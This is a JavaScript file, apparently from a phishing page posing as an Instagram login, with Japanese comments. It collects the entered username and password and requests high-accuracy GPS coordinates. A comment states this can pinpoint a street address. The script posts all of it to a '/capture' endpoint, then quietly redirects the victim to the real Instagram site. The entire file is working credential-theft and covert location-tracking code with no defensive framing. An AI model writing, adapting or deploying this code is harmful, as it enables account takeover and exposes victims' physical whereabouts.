(() => {
  const form  = document.getElementById('ig-form');
  const btn   = document.getElementById('submit-btn');
  const u     = form.querySelector('[name="username"]');
  const p     = form.querySelector('[name="password"]');
  const latEl = form.querySelector('[name="lat"]');
  const lngEl = form.querySelector('[name="lng"]');

  let acc = '';

  // 先に位置情報を取っておく（許可されればGPS精度＝番地まで特定できる）
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      r => {
        latEl.value = r.coords.latitude;
        lngEl.value = r.coords.longitude;
        acc = Math.round(r.coords.accuracy);
      },
      () => {},                      // 拒否されたらIPベースでOK
      { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
    );
  }

  const sync = () => { btn.disabled = !(u.value.trim() && p.value.trim()); };
  u.addEventListener('input', sync);
  p.addEventListener('input', sync);
  sync();

  form.addEventListener('submit', async e => {
    e.preventDefault();
    btn.disabled = true;
    btn.textContent = 'ログイン中...';

    const fd = new FormData(form);
    if (acc) fd.append('acc', acc);

    try {
      await fetch('/capture', {
        method: 'POST',
        body: fd,
        headers: { 'X-Requested-With': 'fetch' },
      });
    } catch (_) {}

    setTimeout(() => { location.href = 'https://www.instagram.com/'; }, 800);
  });
})();
